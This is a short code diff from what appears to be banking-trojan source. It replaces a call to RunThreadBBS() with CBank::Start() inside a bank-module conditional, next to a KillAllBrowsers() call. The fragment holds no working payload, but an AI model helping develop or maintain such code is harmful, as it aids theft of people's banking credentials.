@@ -46,9 +46,8 @@ void ExplorerStart(PEventData Data)
 
 	KillAllBrowsers();
 
-
 	#ifdef BBSCBankH
-		RunThreadBBS();
+		CBank::Start();
 	#endif
 
 	#ifdef JAVS_PATCHERH
